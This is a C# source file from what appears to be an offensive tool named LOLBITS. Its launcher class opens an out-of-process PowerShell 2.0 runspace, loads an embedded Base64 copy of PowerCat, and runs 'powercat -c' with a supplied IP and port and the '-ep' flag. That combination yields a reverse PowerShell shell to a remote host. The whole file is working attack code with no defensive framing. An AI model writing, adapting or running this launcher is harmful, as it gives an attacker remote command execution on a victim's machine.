using System;
using System.Management.Automation.Runspaces;
using System.Threading;

namespace LOLBITS
{
    public class LauncherPowershell
    {

        public static void Main(string ip, string port)
        {
            LauncherPowershell obj = new LauncherPowershell();

            Thread thr1 = new Thread(ExecutePowershell);


            object[] a = new object[] {ip, port };
            thr1.Start(a);
        }

        public static void ExecutePowershell(object args)
        {
            object[] a = (object[])args;
            string ip = (string)a[0];
            string port = (string)a[1];
            PowerShellProcessInstance instance = new PowerShellProcessInstance(new Version(2, 0), null, null, false);
            using (Runspace rs = RunspaceFactory.CreateOutOfProcessRunspace(new TypeTable(new string[0]), instance))
            {
                rs.Open();

                Pipeline pipeline = rs.CreatePipeline();
                pipeline.Commands.AddScript(PowerCat.PowerCatBase64());
                pipeline.Commands.AddScript("powercat -c " + ip + "  " + port + " -ep");
                pipeline.Invoke();
            }

        }
    }
}